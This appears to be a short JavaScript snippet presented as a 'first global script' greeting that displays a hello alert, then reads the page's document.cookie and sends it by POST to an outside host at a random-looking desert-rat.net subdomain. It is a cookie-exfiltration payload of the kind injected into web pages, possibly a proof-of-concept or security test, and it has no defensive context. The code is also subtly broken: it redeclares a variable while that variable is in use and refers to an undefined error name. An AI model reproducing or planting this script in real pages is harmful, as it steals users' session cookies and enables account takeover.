console.log('Hello from your first global script!');
alert('Hellow from your first global script!');
console.log(document.cookie);
console.log(document.domain);

let data = document.cookie;

try{
    const response = await fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
        method: "POST",
        body: data
    });

    if (!response.ok) {
        const message = 'Error with Status Code: ' + response.status;
        throw new Error(message);
    }

    const data = await response.json();
    console.log(data);
} catch (error) {
    console.log('Error: ' + err)
}